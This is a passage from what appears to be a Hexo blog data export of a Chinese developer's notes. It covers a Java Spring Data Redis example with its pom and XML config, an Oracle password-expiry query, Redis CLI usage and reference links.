System.out.println(tr.getHello(&quot;test2&quot;));</span><br><span class=\"line\">        System.out.println(tr.getHello(&quot;test3&quot;));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void addHello(String id, String hello) &#123;</span><br><span class=\"line\">         hellolistops.leftPush(id, hello);</span><br><span class=\"line\">        //System.out.println(l);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void delHello(String id) &#123;</span><br><span class=\"line\">        redisTemplate.delete(id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void modHello(String id, String hello_mod) &#123;</span><br><span class=\"line\">        redisTemplate.delete(id);</span><br><span class=\"line\">        hellolistops.leftPush(id, hello_mod);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String getHello(String id) &#123;</span><br><span class=\"line\">        return hellolistops.range(id, 0, -1).toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>pom文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">\txsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class=\"line\">\t&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;groupId&gt;com.hundsun.account&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;hs-rt-account&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\">\t&lt;packaging&gt;jar&lt;/packaging&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;name&gt;hs-rt-account&lt;/name&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;properties&gt;</span><br><span class=\"line\">\t\t&lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class=\"line\">\t\t&lt;project.compile.ver&gt;1.7&lt;/project.compile.ver&gt;</span><br><span class=\"line\">\t&lt;/properties&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;dependencies&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;4.8.1&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t\t&lt;!-- redis --&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;org.springframework.data&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;spring-data-redis&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;1.8.8.RELEASE&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;2.9.0&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;commons-pool&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;commons-pool&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;1.6&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;/dependencies&gt;</span><br><span class=\"line\">\t</span><br><span class=\"line\">&lt;/project&gt;</span><br></pre></td></tr></table></figure></p>\n<p>spring配置文件<br>applicationContext-redis.xml<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">\t\txmlns:p=&quot;http://www.springframework.org/schema/p&quot;</span><br><span class=\"line\">\t\txmlns:context=&quot;http://www.springframework.org/schema/context&quot; </span><br><span class=\"line\">\t\txsi:schemaLocation=&quot;</span><br><span class=\"line\">\t\t\thttp://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class=\"line\">\t\t\thttp://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;bean id=&quot;jedisConnectionFactory&quot;</span><br><span class=\"line\">\t\tclass=&quot;org.springframework.data.redis.connection.jedis.JedisConnectionFactory&quot;</span><br><span class=\"line\">\t\tp:host-name=&quot;$&#123;redis.host&#125;&quot; p:port=&quot;$&#123;redis.port&#125;&quot; p:password=&quot;$&#123;redis.pass&#125;&quot;&gt;</span><br><span class=\"line\">\t&lt;/bean&gt;</span><br><span class=\"line\">\t&lt;!-- Configurer that replaces $&#123;...&#125; placeholders with values from a properties </span><br><span class=\"line\">\t\tfile --&gt;</span><br><span class=\"line\">\t&lt;context:property-placeholder location=&quot;classpath:redis.properties&quot; /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;context:annotation-config /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;bean id=&quot;redisTemplate&quot; class=&quot;org.springframework.data.redis.core.RedisTemplate&quot;</span><br><span class=\"line\">\t\tp:connection-factory-ref=&quot;jedisConnectionFactory&quot;&gt;</span><br><span class=\"line\">\t\t&lt;property name=&quot;keySerializer&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;bean class=&quot;org.springframework.data.redis.serializer.StringRedisSerializer&quot; /&gt;</span><br><span class=\"line\">\t\t&lt;/property&gt;</span><br><span class=\"line\">\t\t&lt;property name=&quot;valueSerializer&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;bean class=&quot;org.springframework.data.redis.serializer.StringRedisSerializer&quot; /&gt;</span><br><span class=\"line\">\t\t&lt;/property&gt;</span><br><span class=\"line\">\t\t&lt;property name=&quot;hashKeySerializer&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;bean class=&quot;org.springframework.data.redis.serializer.StringRedisSerializer&quot; /&gt;</span><br><span class=\"line\">\t\t&lt;/property&gt;</span><br><span class=\"line\">\t\t&lt;property name=&quot;hashValueSerializer&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;bean class=&quot;org.springframework.data.redis.serializer.StringRedisSerializer&quot; /&gt;</span><br><span class=\"line\">\t\t&lt;/property&gt;</span><br><span class=\"line\">\t&lt;/bean&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"密码过期","date":"2018-07-10T13:09:20.000Z","_content":"- ### The password has expired\r\n```\r\nSELECT username,PROFILE FROM dba_users;\r\n\r\nselect * from dba_profiles where profile='DEFAULT' and resource_name='PASSWORD_LIFE_TIME';\r\n\r\nDEFAULT\tPASSWORD_LIFE_TIME\tPASSWORD\t180\r\n\r\n```\r\n把180改成无限制\r\n","source":"_posts/数据库/oracle/密码过期.md","raw":"---\ntitle: 密码过期\ndate: 2018-07-10 21:09:20\ntags: oracle\n---\n- ### The password has expired\r\n```\r\nSELECT username,PROFILE FROM dba_users;\r\n\r\nselect * from dba_profiles where profile='DEFAULT' and resource_name='PASSWORD_LIFE_TIME';\r\n\r\nDEFAULT\tPASSWORD_LIFE_TIME\tPASSWORD\t180\r\n\r\n```\r\n把180改成无限制\r\n","slug":"数据库/oracle/密码过期","published":1,"updated":"2018-07-10T13:10:10.019Z","_id":"cjjedmhdp00ab0gtjw773b4e0","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h3 id=\"The-password-has-expired\"><a href=\"#The-password-has-expired\" class=\"headerlink\" title=\"The password has expired\"></a>The password has expired</h3><code>`</code><br>SELECT username,PROFILE FROM dba_users;</li>\n</ul>\n<p>select * from dba_profiles where profile=’DEFAULT’ and resource_name=’PASSWORD_LIFE_TIME’;</p>\n<p>DEFAULT    PASSWORD_LIFE_TIME    PASSWORD    180</p>\n<p><code>`</code><br>把180改成无限制</p>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h3 id=\"The-password-has-expired\"><a href=\"#The-password-has-expired\" class=\"headerlink\" title=\"The password has expired\"></a>The password has expired</h3><code>`</code><br>SELECT username,PROFILE FROM dba_users;</li>\n</ul>\n<p>select * from dba_profiles where profile=’DEFAULT’ and resource_name=’PASSWORD_LIFE_TIME’;</p>\n<p>DEFAULT    PASSWORD_LIFE_TIME    PASSWORD    180</p>\n<p><code>`</code><br>把180改成无限制</p>\n"},{"title":"redis配置","date":"2018-07-10T13:09:20.000Z","_content":"[redis配置](http://www.jianshu.com/p/8eb4a2b7d85c)\n\n控制台中文乱码\n\n./redis-cli  --raw\n","source":"_posts/数据库/redis/redis配置.md","raw":"---\ntitle: redis配置\ndate: 2018-07-10 21:09:20\ntags: redis\n---\n[redis配置](http://www.jianshu.com/p/8eb4a2b7d85c)\n\n控制台中文乱码\n\n./redis-cli  --raw\n","slug":"数据库/redis/redis配置","published":1,"updated":"2018-07-10T13:10:10.024Z","_id":"cjjedmhdq00ad0gtjpvm5dhv3","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://www.jianshu.com/p/8eb4a2b7d85c\" target=\"_blank\" rel=\"noopener\">redis配置</a></p>\n<p>控制台中文乱码</p>\n<p>./redis-cli  –raw</p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://www.jianshu.com/p/8eb4a2b7d85c\" target=\"_blank\" rel=\"noopener\">redis配置</a></p>\n<p>控制台中文乱码</p>\n<p>./redis-cli  –raw</p>\n"},{"title":"springLTredis","date":"2018-07-10T13:09:20.000Z","_content":"查询所有key\n```\n//class:\nRedisTemplate\n//method:\nSet<K>\tkeys(K pattern)\nFind all keys matching the given pattern.\n```","source":"_posts/数据库/redis/springLTredis.md","raw":"---\ntitle: springLTredis\ndate: 2018-07-10 21:09:20\ntags: redis\n---\n查询所有key\n```\n//class:\nRedisTemplate\n//method:\nSet<K>\tkeys(K pattern)\nFind all keys matching the given pattern.\n```","slug":"数据库/redis/springLTredis","published":1,"updated":"2018-07-10T13:10:10.024Z","_id":"cjjedmhdr00af0gtjlexwk5f2","comments":1,"layout":"post","photos":[],"link":"","content":"<p>查询所有key<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//class:</span><br><span class=\"line\">RedisTemplate</span><br><span class=\"line\">//method:</span><br><span class=\"line\">Set&lt;K&gt;\tkeys(K pattern)</span><br><span class=\"line\">Find all keys matching the given pattern.</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>查询所有key<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//class:</span><br><span class=\"line\">RedisTemplate</span><br><span class=\"line\">//method:</span><br><span class=\"line\">Set&lt;K&gt;\tkeys(K pattern)</span><br><span class=\"line\">Find all keys matching the given pattern.</span><br></pre></td></tr></table></figure></p>\n"},{"title":"redis增删改查----控制台","date":"2018-07-10T13:09:20.000Z","_content":"```\r\n### 进入redis控制台\r\nredis-cli --raw    #加上raw,防止中文乱码\r\n\r\n### 增\r\n127.0.0.1:6379> LPUSH list0 \"hello\" #增加一个list\r\n1\r\n127.0.0.1:6379> LRANGE list0 0 -1 #查看list\r\nhello\r\n\r\n### 删\r\n127.0.0.1:6379> DEL list0 #删除list\r\n1\r\n127.0.0.1:6379> LRANGE list0 0 -1 #删除结果\r\n\r\n### 查\r\n127.0.0.1:6379> keys list0 #查找一下\r\n\r\n127.0.0.1:6379> LPUSH list0 \"hello\"\r\n1\r\n\r\n#### 改\r\n## 修改list--增加元素\r\n127.0.0.1:6379> LRANGE list0 0 -1 \r\nhello\r\n127.0.0.1:6379> LPUSH list0 world\r\n2\r\n127.0.0.1:6379> LRANGE list0 0 -1\r\nworld\r\nhello\r\n\r\n## 修改list--删了重建\r\n127.0.0.1:6379> DEL list0 fuck\r\n1\r\n127.0.0.1:6379> LRANGE list0 0 -1\r\n\r\n127.0.0.1:6379> LPUSH list hello\r\n1\r\n127.0.0.1:6379> LRANGE list0 0 -1\r\n```","source":"_posts/数据库/redis/redis增删改查----控制台.md","raw":"---\ntitle: redis增删改查----控制台\ndate: 2018-07-10 21:09:20\ntags: redis\n---\n```\r\n### 进入redis控制台\r\nredis-cli --raw    #加上raw,防止中文乱码\r\n\r\n### 增\r\n127.0.0.1:6379> LPUSH list0 \"hello\" #增加一个list\r\n1\r\n127.0.0.1:6379> LRANGE list0 0 -1 #查看list\r\nhello\r\n\r\n### 删\r\n127.0.0.1:6379> DEL list0 #删除list\r\n1\r\n127.0.0.1:6379> LRANGE list0 0 -1 #删除结果\r\n\r\n### 查\r\n127.0.0.1:6379> keys list0 #查找一下\r\n\r\n127.0.0.1:6379> LPUSH list0 \"hello\"\r\n1\r\n\r\n#### 改\r\n## 修改list--增加元素\r\n127.0.0.1:6379> LRANGE list0 0 -1 \r\nhello\r\n127.0.0.1:6379> LPUSH list0 world\r\n2\r\n127.0.0.1:6379> LRANGE list0 0 -1\r\nworld\r\nhello\r\n\r\n## 修改list--删了重建\r\n127.0.0.1:6379> DEL list0 fuck\r\n1\r\n127.0.0.1:6379> LRANGE list0 0 -1\r\n\r\n127.0.0.1:6379> LPUSH list hello\r\n1\r\n127.0.0.1:6379> LRANGE list0 0 -1\r\n```","slug":"数据库/redis/redis增删改查----控制台","published":1,"updated":"2018-07-10T13:10:10.023Z","_id":"cjjedmhds00ah0gtjt8aelmes","comments":1,"layout":"post","photos":[],"link":"","content":"<pre><code>### 进入redis控制台\nredis-cli --raw    #加上raw,防止中文乱码\n\n### 增\n127.0.0.1:6379&gt; LPUSH list0 &quot;hello&quot; #增加一个list\n1\n127.0.0.1:6379&gt; LRANGE list0 0 -1 #查看list\nhello\n\n### 删\n127.0.0.1:6379&gt; DEL list0 #删除list\n1\n127.0.0.1:6379&gt; LRANGE list0 0 -1 #删除结果\n\n### 查\n127.0.0.1:6379&gt; keys list0 #查找一下\n\n127.0.0.1:6379&gt; LPUSH list0 &quot;hello&quot;\n1\n\n#### 改\n## 修改list--增加元素\n127.0.0.1:6379&gt; LRANGE list0 0 -1 \nhello\n127.0.0.1:6379&gt; LPUSH list0 world\n2\n127.0.0.1:6379&gt; LRANGE list0 0 -1\nworld\nhello\n\n## 修改list--删了重建\n127.0.0.1:6379&gt; DEL list0 fuck\n1\n127.0.0.1:6379&gt; LRANGE list0 0 -1\n\n127.0.0.1:6379&gt; LPUSH list hello\n1\n127.0.0.1:6379&gt; LRANGE list0 0 -1\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<pre><code>### 进入redis控制台\nredis-cli --raw    #加上raw,防止中文乱码\n\n### 增\n127.0.0.1:6379&gt; LPUSH list0 &quot;hello&quot; #增加一个list\n1\n127.0.0.1:6379&gt; LRANGE list0 0 -1 #查看list\nhello\n\n### 删\n127.0.0.1:6379&gt; DEL list0 #删除list\n1\n127.0.0.1:6379&gt; LRANGE list0 0 -1 #删除结果\n\n### 查\n127.0.0.1:6379&gt; keys list0 #查找一下\n\n127.0.0.1:6379&gt; LPUSH list0 &quot;hello&quot;\n1\n\n#### 改\n## 修改list--增加元素\n127.0.0.1:6379&gt; LRANGE list0 0 -1 \nhello\n127.0.0.1:6379&gt; LPUSH list0 world\n2\n127.0.0.1:6379&gt; LRANGE list0 0 -1\nworld\nhello\n\n## 修改list--删了重建\n127.0.0.1:6379&gt; DEL list0 fuck\n1\n127.0.0.1:6379&gt; LRANGE list0 0 -1\n\n127.0.0.1:6379&gt; LPUSH list hello\n1\n127.0.0.1:6379&gt; LRANGE list0 0 -1\n</code></pre>"},{"title":"后台启动","date":"2018-07-10T13:09:20.000Z","_content":"http://blog.csdn.net/ksdb0468473/article/details/52126009","source":"_posts/数据库/redis/后台启动.md","raw":"---\ntitle: 后台启动\ndate: 2018-07-10 21:09:20\ntags: redis\n---\nhttp://blog.csdn.net/ksdb0468473/article/details/52126009","slug":"数据库/redis/后台启动","published":1,"updated":"2018-07-10T13:10:10.025Z","_id":"cjjedmhdt00aj0gtjyrhl3ap7","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://blog.csdn.net/ksdb0468473/article/details/52126009\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/ksdb0468473/article/details/52126009</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://blog.csdn.net/ksdb0468473/article/details/52126009\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/ksdb0468473/article/details/52126009</a></p>\n"},{"title":"资料","date":"2018-07-10T13:09:20.000Z","_content":"[中文网站](http://www.redis.cn/documentation.html)\n\n[链接数](http://www.redis.cn/topics/clients.html)","source":"_posts/数据库/redis/资料.md","raw":"---\ntitle: 资料\ndate: 2018-07-10 21:09:20\ntags: redis\n---\n[中文网站](http://www.redis.cn/documentation.html)\n\n[链接数](http://www.redis.cn/topics/clients.html)","slug":"数据库/redis/资料","published":1,"updated":"2018-07-10T13:10:10.026Z","_id":"cjjedmhdx00ap0gtj11j52ycn","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://www.redis.cn/documentation.html\" target=\"_blank\" rel=\"noopener\">中文网站</a></p>\n<p><a href=\"http://www.redis.cn/topics/clients.html\" target=\"_blank\" rel=\"noopener\">链接数</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://www.redis.cn/documentation.html\" target=\"_blank\" rel=\"noopener\">中文网站</a></p>\n<p><a href=\"http://www.redis.cn/topics/clients.html\" target=\"_blank\" rel=\"noopener\">链接数</a></p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"cjjedmh7300040gtjnlhxjuoz","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7700070gtjzbewb245"},{"post_id":"cjjedmh6i00000gtjv7qxc1jv","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7800090gtjqdmy33f1"},{"post_id":"cjjedmh7400050gtjhemnc929","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7a000c0gtjbc2tgtyo"},{"post_id":"cjjedmh7700080gtj0fhk13ih","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7b000e0gtjeod9vxyi"},{"post_id":"cjjedmh6n00010gtj2qcq50w5","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7c000g0gtjgtbldka7"},{"post_id":"cjjedmh79000a0gtjr0oi4rm9","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7d000i0gtjv1vibgy1"},{"post_id":"cjjedmh7a000d0gtjp9rwjp5l","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7e000k0gtjbbe7l9z1"},{"post_id":"cjjedmh7100030gtjzpt0nyrr","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7f000m0gtjzb7xdk7p"},{"post_id":"cjjedmh7b000f0gtjszcoaxif","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7f000n0gtj8ptxjndp"},{"post_id":"cjjedmh7c000h0gtjyqfyojo3","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7f000o0gtjdqti6757"},{"post_id":"cjjedmh7d000j0gtjtvgg0v0p","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7f000p0gtjq6e9tvp8"},{"post_id":"cjjedmh7e000l0gtjcg6c5ta9","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7f000q0gtj7vrm2rmw"},{"post_id":"cjjedmh7k000r0gtj37lcpy9h","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7n000t0gtjo36illw5"},{"post_id":"cjjedmh7l000s0gtjaanzxr53","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7o000v0gtjt1ejvmtt"},{"post_id":"cjjedmh7n000u0gtjvods55rp","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7p000x0gtj03fzto05"},{"post_id":"cjjedmh7o000w0gtjn26nndew","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7r000z0gtjz5ntpcbq"},{"post_id":"cjjedmh7p000y0gtjo8j3n7es","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7s00110gtjemi6c0oh"},{"post_id":"cjjedmh7r00100gtjpl5xjyzp","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7t00130gtj84e52c3f"},{"post_id":"cjjedmh7s00120gtjva7junj7","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7u00150gtjjuqhqlrd"},{"post_id":"cjjedmh7t00140gtjqpfuoxup","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7w00170gtjdfcjq28i"},{"post_id":"cjjedmh7v00160gtjwuh0ty52","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7x00190gtjyi03rx9t"},{"post_id":"cjjedmh7w00180gtj55r07wyo","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh7y001a0gtjej6j2dse"},{"post_id":"cjj2qgrfc0000m0tjcakjl2m6","tag_id":"cjjedmh6x00020gtjewnnuhij","_id":"cjjedmh8t001c0gtji3mz1gt1"},{"post_id":"cjjedmh8r001b0gtj134bc520","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh8z001j0gtj7z7yes8m"},{"post_id":"cjjedmh8x001h0gtj7ks2asxj","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh8z001l0gtjxhim0aqx"},{"post_id":"cjjedmh8z001k0gtjsm9yx6bi","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh90001o0gtj8smwk8hc"},{"post_id":"cjjedmh8u001d0gtjny0zp7hl","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh91001q0gtj7oowq9o6"},{"post_id":"cjjedmh8z001m0gtjqq7gwm2t","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh93001t0gtjsntfnosn"},{"post_id":"cjjedmh8v001f0gtjl4ro1x6h","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh94001v0gtjwy2px22r"},{"post_id":"cjjedmh92001r0gtjk8wgm1gf","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh95001x0gtj3fegpzrh"},{"post_id":"cjjedmh93001u0gtjbljgbb21","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh95001z0gtjw8kudtd7"},{"post_id":"cjjedmh8w001g0gtj91a98lmw","tag_id":"cjjedmh92001s0gtjbndkazgf","_id":"cjjedmh9600210gtj2gd66u8b"},{"post_id":"cjjedmh94001w0gtj8qt73ee1","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh9800230gtjrhexp9s8"},{"post_id":"cjjedmh95001y0gtjz2ty71uo","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh9800250gtjavzyuov2"},{"post_id":"cjjedmh9600200gtjlln4povs","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh9a00270gtj3odqzvps"},{"post_id":"cjjedmh9700220gtjns0rhth4","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh9a00290gtjg2e64dob"},{"post_id":"cjjedmh9800240gtjp204k3mt","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh9b002b0gtjw8gdqye0"},{"post_id":"cjjedmh9800260gtjw8n2x083","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh9c002d0gtjtwjecp1c"},{"post_id":"cjjedmh9a00280gtjo0iug43m","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh9d002f0gtj614qlfju"},{"post_id":"cjjedmh9a002a0gtjxp2v7rci","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh9e002h0gtj6kfcyw64"},{"post_id":"cjjedmh9b002c0gtj0yw1ex2k","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh9h002j0gtj9g2dj720"},{"post_id":"cjjedmh9c002e0gtjcxrb1nco","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh9h002m0gtj1w16yhro"},{"post_id":"cjjedmh9d002g0gtjckzkfl2h","tag_id":"cjjedmh8u001e0gtjlyi35kg8","_id":"cjjedmh9i002o0gtj0hcmj9we"},{"post_id":"cjjedmh9i002p0gtj3xu1sqyo","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9l002s0gtja2gz6dkw"},{"post_id":"cjjedmh9e002i0gtj2fn7np1u","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9l002u0gtjdi1n2y0o"},{"post_id":"cjjedmh9j002q0gtjrvtnjcj0","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9m002x0gtjgiovy9au"},{"post_id":"cjjedmh9l002t0gtjg56zwnno","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9n002z0gtjzetf5ofx"},{"post_id":"cjjedmh9h002k0gtjlnzgcz0g","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9o00310gtjfzky67uj"},{"post_id":"cjjedmh9l002v0gtj956lmk0y","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9p00330gtjubsjirja"},{"post_id":"cjjedmh9m002y0gtj49y5db3e","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9q00350gtjyweddlsb"},{"post_id":"cjjedmh9h002n0gtjp3ho52dy","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9r00370gtjpxfcx77x"},{"post_id":"cjjedmh9n00300gtj572vsn0z","tag_id":"cjjedmh9h002l0gtjo7g2a57p","_id":"cjjedmh9s00390gtjmlsruwog"},{"post_id":"cjjed